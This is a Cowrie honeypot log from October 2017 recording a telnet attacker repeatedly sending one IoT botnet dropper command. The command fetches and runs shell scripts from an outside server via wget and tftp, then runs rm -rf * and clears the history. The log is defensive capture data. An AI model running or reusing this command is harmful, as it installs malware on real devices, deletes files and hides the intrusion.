+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:03+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:10+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:13+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:14+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:14+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:14+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:14+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:14+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:14+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:14+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:22+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:29+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:32+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:32+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:33+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:41+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:42+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:48+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:48:52+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
